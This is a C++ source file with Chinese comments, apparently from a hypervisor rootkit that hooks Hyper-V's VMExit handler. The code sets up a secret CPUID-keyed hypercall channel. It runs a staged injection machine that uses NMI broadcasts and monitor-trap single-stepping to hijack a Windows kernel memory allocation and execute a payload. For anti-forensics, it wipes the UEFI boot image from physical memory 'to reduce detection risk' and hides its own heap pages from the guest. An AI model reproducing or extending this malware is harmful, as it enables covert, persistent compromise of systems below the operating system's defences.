#include <intrin.h>
#include "vmexit_dispatch.h"

#include "../modules/arch/arch.h"
#include "../modules/crt/crt.h"
#include "../hypercall/hypercall.h"
#include <hypercall/hypercall_def.h>
#include "../modules/interrupts/interrupts.h"
#include "../modules/loader/imports.h"
#include "../modules/logs/logs.h"
#include "../modules/memory_manager/memory_manager.h"
#include "../modules/slat/slat.h"
#include "../modules/slat/cr3/cr3.h"
#include "../modules/slat/violation/violation.h"
#include "../manager/loader/deployer.h"
#include "../modules/apic/apic.h"
#include "../../shared/structures/trap_frame.h"

#include "runtime_context.h"

namespace
{
    // 业务说明：全局状态已移至 g_runtime_context。
}

/**
 * @description 判断是否为合法的 Hypercall 请求。
 * @param {const hypercall_info_t&} hypercall_info Hypercall 关键信息，包含主次校验键。
 * @return {bool} 是否匹配 Hypercall 主次校验键。
 * @throws {无} 不抛出异常。
 * @example
 * const hypercall_info_t info = { .value = trap_frame->rcx };
 * const bool is_valid = is_hypercall_request(info);
 */
bool is_hypercall_request(const hypercall_info_t& hypercall_info)
{
    return hypercall_info.primary_key == hypercall_primary_key && hypercall_info.secondary_key == hypercall_secondary_key;
}

/**
 * @description 尝试处理 Hypercall VMExit 请求。
 * @param {const std::uint64_t} a1 VMExit 上下文参数。
 * @return {bool} 是否为 Hypercall 并已处理。
 * @throws {无} 不抛出异常。
 * @example
 * const bool handled = try_process_hypercall_exit(a1);
 */
bool try_process_hypercall_exit(const std::uint64_t a1)
{
    // 业务说明：从 TrapFrame 提取 Hypercall 信息并校验密钥。
    // 输入：VMExit TrapFrame 指针；输出：是否处理；规则：密钥匹配才处理；异常：不抛出。
    trap_frame_t* const trap_frame = *reinterpret_cast<trap_frame_t**>(a1);
    const hypercall_info_t hypercall_info = { .value = trap_frame->rcx };

    if (!is_hypercall_request(hypercall_info))
    {
        return false;
    }

    // 业务说明：保存与恢复来宾栈指针，执行 Hypercall 处理并推进来宾 RIP。
    // 输入：trap_frame 与 hypercall_info；输出：处理结果；规则：执行后推进 RIP；异常：不抛出。
    trap_frame->rsp = arch::get_guest_rsp();
    hypercall::process(hypercall_info, trap_frame);
    arch::set_guest_rsp(trap_frame->rsp);
    arch::advance_guest_rip();
    return true;
}

/**
 * @description 判断当前是否处于 VTL0 内核上下文。
 * @param {void} 无。
 * @return {bool} 是否为 VTL0 内核。
 * @throws {无} 不抛出异常。
 * @example
 * const bool is_vtl0 = is_vtl0_context();
 */
bool is_vtl0_context()
{
    // 业务说明：通过校验 Guest CR3 是否为初始化时记录的内核 CR3，且 CPL 是否为 0 来确定 VTL0。
    // 输入：全局上下文中的 guest_kernel_cr3；输出：是否匹配；规则：CR3 匹配且 CPL=0；异常：不抛出。
    return arch::get_guest_cr3().flags == g_runtime_context.injection_ctx.guest_kernel_cr3 && arch::get_guest_cpl() == 0;
}

/**
 * @description 全局注入状态机维护逻辑 (对应 injection_manager.cpp 逻辑)
 * @param guest_rip Guest RIP
 * @param trap_frame Trap Frame
 * @return bool 如果处理了 Magic Trap 并需要立即返回，则返回 true
 */
bool process_injection_state_tick(uint64_t guest_rip, trap_frame_t* trap_frame)
{
    auto& ctx = g_runtime_context.injection_ctx;
    const uint32_t current_stage = ctx.stage.load();

    // 0. Magic Trap Logic (Stage 4 check)
    if (guest_rip == injection_ctx_t::MAGIC_TRAP_RIP)
    {
        if (loader::harvest_allocation_result(&g_runtime_context.loader_ctx, trap_frame))
        {
            loader::execute_payload_hijack(&g_runtime_context.loader_ctx, trap_frame);
            ctx.stage.store(4); // Done
            return true; // Handled
        }
    }

    // 1. Warm-up Counter (Stage 0 -> 1)
    if (current_stage == 0)
    {
        if (arch::get_guest_cpl() == 3)
        {
            if (ctx.injection_counter.fetch_add(1) >= 120000)
            {
                ctx.stage.store(1);
                logs::print(&g_runtime_context.log_ctx, "[Inject] Armed (Stage 1).\n");
            }
        }
    }

    // 2. Broadcast / Hunt (Stage 1)
    if (current_stage == 1)
    {
        // NMI Broadcast Cooldown (Prevent Watchdog Timeout / NMI Storm)
        const uint64_t current_tsc = __rdtsc();
        const uint64_t last_tsc = ctx.last_broadcast_tsc.load();
        if (current_tsc > last_tsc && (current_tsc - last_tsc < 20000000)) // ~10ms @ 2GHz
        {
             return false;
        }

        uint32_t expected = 1;
        if (ctx.send_state.compare_exchange_strong(expected, 0))
        {
             ctx.last_broadcast_tsc.store(current_tsc);

             // Round-robin target selection (0-16)
             const uint32_t target_core = ctx.target_core_idx.fetch_add(1) % 16;
             
             // Send NMI to force exit on target core
             if (g_runtime_context.apic_instance)
             {
                 g_runtime_context.apic_instance->send_nmi(target_core);
             }
        }
    }

    return false;
}

/**
 * @description 尝试在 MTF 中进行注入劫持 (对应 handlers.cpp 逻辑)
 * @param trap_frame Trap Frame
 * @return bool 如果劫持成功返回 true
 */
bool try_injection_hijack_on_mtf(trap_frame_t* trap_frame)
{
    // 快速检查：必须是 VTL0 且处于 Stage 1
    if (!is_vtl0_context() || g_runtime_context.injection_ctx.stage.load() != 1)
    {
        return false;
    }

    // 检查约束条件
    const auto cr8 = arch::get_guest_cr8();
    const bool interrupts_enabled = (arch::get_guest_rflags() & 0x200) != 0;

    if (cr8 > 1 || !interrupts_enabled)
    {
        // 约束未满足，重新广播
        // Remove log to prevent deadlock in high IRQL / NMI context
        arch::disable_mtf();
        g_runtime_context.injection_ctx.send_state.store(1);
        return false;
    }

    // 约束满足，执行劫持
    logs::print(&g_runtime_context.log_ctx, "[Inject] Hijacking at IRQL %d...\n", cr8);
    g_runtime_context.injection_ctx.stage.store(2); // Stage Update

    if (loader::prepare_allocation_hijack(&g_runtime_context.loader_ctx, trap_frame))
    {
        arch::disable_mtf();
        return true; // Hijack successful
    }

    // 劫持失败，回滚
    logs::print(&g_runtime_context.log_ctx, "[Inject] Hijack failed, reverting.\n");
    arch::disable_mtf();
    g_runtime_context.injection_ctx.stage.store(1);
    g_runtime_context.injection_ctx.send_state.store(1);
    return false;
}

/**
 * @description VMExit 分发处理，按退出类型路由到对应模块。
 * @param {const std::uint64_t} exit_reason VMExit 退出原因。
 * @param {const std::uint64_t} a1 VMExit 上下文参数，用于处理 CPUID/HYPERCALL。
 * @return {bool} 是否已被当前分发处理并可提前返回。
 * @throws {无} 不抛出异常。
 * @example
 * const bool handled = dispatch_vmexit(exit_reason, a1);
 */
bool dispatch_vmexit(const std::uint64_t exit_reason, const std::uint64_t a1)
{
    trap_frame_t* const trap_frame = *reinterpret_cast<trap_frame_t**>(a1);

    // 1. 全局业务逻辑 Tick (注入状态机)
    //    将所有“非 Exit Reason 触发”的逻辑移入此处
    if (process_injection_state_tick(arch::get_guest_rip(), trap_frame))
    {
        return true; // Magic Trap 命中，直接返回
    }

    // 2. 根据 Exit Reason 分发
    if (arch::is_cpuid(exit_reason))
    {
        return try_process_hypercall_exit(a1);
    }

    if (arch::is_slat_violation(exit_reason))
    {
        // 保持原有逻辑，或者也封装进 slat::process_violation
        return slat::violation::process(&g_runtime_context.slat_ctx) == 1;
    }

    if (arch::is_non_maskable_interrupt_exit(exit_reason))
    {
        interrupts::process_nmi(&g_runtime_context.interrupts_ctx);
        
        // 注入逻辑：如果是 Hunting 阶段，NMI 后开启 MTF
        if (g_runtime_context.injection_ctx.stage.load() == 1)
        {
            arch::enable_mtf();
        }
        return false;
    }

    if (arch::is_mtf_exit(exit_reason))
    {
        // 优先尝试注入逻辑
        if (try_injection_hijack_on_mtf(trap_frame))
        {
            return true; // 劫持成功，修改了 RIP，直接返回
        }

        // 常规 MTF 处理（SLAT trace 等）
        slat::violation::handle_mtf(&g_runtime_context.slat_ctx);
        return true;
    }

    return false;
}

/**
 * @description 清理 UEFI 启动镜像，抹除其物理内存内容。
 * @param {void} 无。
 * @return {void} 无返回值。
 * @throws {无} 不抛出异常。
 * @example
 * clean_up_uefi_boot_image();
 */
void clean_up_uefi_boot_image()
{
    // 业务说明：通过 Host 物理映射清理 UEFI 启动镜像内容，降低残留痕迹。
    // 输入：uefi_boot_physical_base_address 与 uefi_boot_image_size；输出：清零后的物理内存；规则：仅在有效映射后写零；异常：不抛出。
    const auto mapped_uefi_boot_base = static_cast<std::uint8_t*>(memory_manager::map_host_physical(g_runtime_context.uefi_boot_physical_base_address));
    crt::set_memory(mapped_uefi_boot_base, 0, g_runtime_context.uefi_boot_image_size);
}

/**
 * @description 处理首次 VMExit 以及分阶段部署逻辑。
 * @param {void} 无。
 * @return {void} 无返回值。
 * @throws {无} 不抛出异常。
 * @example
 * process_first_vmexit();
 */
void process_first_vmexit()
{
    if (g_runtime_context.is_first_vmexit == 1)
    {
        // 业务说明：首次 VMExit 初始化控制流，完成 SLAT、NMI、清理镜像与导出校验。
        // 输入：全局状态与配置；输出：组件初始化完成；规则：仅首次执行；异常：不抛出。
        logs::print(&g_runtime_context.log_ctx, "[Runtime] First VMExit captured. Taking control...\n"); // 打印日志，记录首次捕获到 VMExit，接管控制流
        slat::process_first_vmexit(&g_runtime_context.slat_ctx); // 初始化 SLAT 并在首次 VMExit 时建立页表映射
        g_runtime_context.loader_ctx.guest_cr3 = arch::get_guest_cr3(); // 获取并保存来宾机（Guest）当前的 CR3 寄存器值
        g_runtime_context.injection_ctx.guest_kernel_cr3 = g_runtime_context.loader_ctx.guest_cr3.flags; // 将来宾机内核 CR3 记录到注入上下文中，供后续注入逻辑使用
        g_runtime_context.loader_ctx.slat_cr3 = slat::hyperv_cr3(&g_runtime_context.slat_ctx); // 获取并保存 Hyper-V 自身的 CR3（用于 SLAT）
        interrupts::set_up(&g_runtime_context.interrupts_ctx, g_runtime_context.apic_instance, &g_runtime_context.nmi_ready_bitmap, &original_nmi_handler); // 设置中断处理环境
        g_runtime_context.original_nmi_handler = original_nmi_handler; // 备份原始 NMI 处理程序的入口地址
        clean_up_uefi_boot_image(); // 清理 UEFI 启动阶段残留的镜像内存，降低被检测风险

        // 业务说明：首次 VMExit 验证关键导出符号是否可解析。
        // 输入：ntoskrnl_base；输出：解析结果日志；规则：仅 ntoskrnl_base 非零时执行；异常：不抛出。
        if (g_runtime_context.ntoskrnl_base != 0)
        {
            const uint64_t mm_alloc_api = loader::resolve_mm_allocate_independent_pages_ex(g_runtime_context.ntoskrnl_base);
            if (mm_alloc_api)
            {
                logs::print(&g_runtime_context.log_ctx, "[Step 1] Success: MmAllocateIndependentPagesEx = 0x%p\n", mm_alloc_api);
            }
            else
            {
                logs::print(&g_runtime_context.log_ctx, "[Step 1] ERROR: Failed to resolve MmAllocateIndependentPagesEx from 0x%p\n", g_runtime_context.ntoskrnl_base);
            }

        }

        g_runtime_context.is_first_vmexit = 0;
    }

    // 业务说明：按 VMExit 次数触发堆页隐藏流程。
    // 输入：VMExit 计数；输出：隐藏状态；规则：达到阈值才执行；异常：不抛出。
    if (g_runtime_context.has_hidden_heap_pages == 0)
    {
        g_runtime_context.vmexit_count++;

        if (g_runtime_context.vmexit_count >= 5)
        {
            // 业务说明：达到阈值后隐藏堆页。
            // 输入：CR3 与阈值；输出：隐藏结果；规则：成功后标记完成；异常：不抛出。
            g_runtime_context.has_hidden_heap_pages = slat::hide_heap_pages(
                &g_runtime_context.slat_ctx, 
                slat::hyperv_cr3(&g_runtime_context.slat_ctx),
                g_runtime_context.heap_ctx.initial_physical_base,
                g_runtime_context.heap_ctx.initial_size
            );

            if (g_runtime_context.has_hidden_heap_pages == 1)
            {
                logs::print(&g_runtime_context.log_ctx, "[Runtime] Heap memory hiding complete (Total 2M VMExits threshold met).\n");
            }
        }
    }
}

/**
 * @description 用于提前返回的 VMExit 处理结果。
 * @param {void} 无。
 * @return {std::uint64_t} Intel VMExit 提前返回值。
 * @throws {无} 不抛出异常。
 * @example
 * return do_vmexit_premature_return();
 */
std::uint64_t do_vmexit_premature_return()
{
    return 0;
}

/**
 * @description 设置 VMExit 运行时状态与 UEFI 镜像信息。
 * @param {std::uint8_t*} original_vmexit_handler_routine 原始 VMExit 处理器地址。
 * @param {std::uint64_t} uefi_boot_physical_base_address_in UEFI Boot 镜像物理基址。
 * @param {std::uint64_t} uefi_boot_image_size_in UEFI Boot 镜像大小。
 * @return {void} 无返回值。
 * @throws {无} 不抛出异常。
 * @example
 * set_vmexit_runtime_state(original_handler, uefi_base, uefi_size);
 */
void set_vmexit_runtime_state(std::uint8_t* original_vmexit_handler_routine, const std::uint64_t uefi_boot_physical_base_address_in, const std::uint64_t uefi_boot_image_size_in)
{
    // 业务说明：保存 VMExit 处理器与 UEFI 镜像信息，供清理流程使用。
    // 输入：原始 VMExit 处理器与镜像信息；输出：缓存状态；规则：入口阶段设置；异常：不抛出。
    g_runtime_context.original_vmexit_handler = original_vmexit_handler_routine;
    g_runtime_context.uefi_boot_physical_base_address = uefi_boot_physical_base_address_in;
    g_runtime_context.uefi_boot_image_size = uefi_boot_image_size_in;
}

/**
 * @description 设置 ntoskrnl 基址供 VMExit/导出解析使用。
 * @param {std::uint64_t} ntoskrnl_base_in ntoskrnl.exe 基址。
 * @return {void} 无返回值。
 * @throws {无} 不抛出异常。
 * @example
 * set_ntoskrnl_base(ntoskrnl_base_from_uefi);
 */
void set_ntoskrnl_base(const std::uint64_t ntoskrnl_base_in)
{
    // 业务说明：记录 ntoskrnl 基址，供导出解析使用。
    // 输入：ntoskrnl_base_in；输出：缓存状态；规则：入口阶段设置；异常：不抛出。
    g_runtime_context.ntoskrnl_base = ntoskrnl_base_in;
}

/**
 * @description 获取当前 ntoskrnl 基址。
 * @param {void} 无。
 * @return {std::uint64_t} 当前保存的 ntoskrnl 基址。
 * @throws {无} 不抛出异常。
 * @example
 * const auto base = get_ntoskrnl_base();
 */
std::uint64_t get_ntoskrnl_base()
{
    return g_runtime_context.ntoskrnl_base;
}

/**
 * @description VMExit 入口函数，完成首次处理与分发逻辑。
 * @param {const std::uint64_t} a1 VMExit 参数1。
 * @param {const std::uint64_t} a2 VMExit 参数2。
 * @param {const std::uint64_t} a3 VMExit 参数3。
 * @param {const std::uint64_t} a4 VMExit 参数4。
 * @return {std::uint64_t} VMExit 返回值。
 * @throws {无} 不抛出异常。
 * @example
 * const auto result = vmexit_handler_detour(a1, a2, a3, a4);
 */
std::uint64_t vmexit_handler_detour(const std::uint64_t a1, const std::uint64_t a2, const std::uint64_t a3, const std::uint64_t a4)
{
    // 业务说明：处理首次 VMExit 并按退出原因进行分发。
    // 输入：VMExit 参数；输出：返回值或原处理器回调；规则：可提前返回；异常：不抛出。
    process_first_vmexit();

    const std::uint64_t exit_reason = arch::get_vmexit_reason();
    if (dispatch_vmexit(exit_reason, a1))
    {
        return do_vmexit_premature_return();
    }

    const auto original_vmexit_handler_function = reinterpret_cast<std::uint64_t(*)(std::uint64_t, std::uint64_t, std::uint64_t, std::uint64_t)>(g_runtime_context.original_vmexit_handler);
    return original_vmexit_handler_function(a1, a2, a3, a4);
}
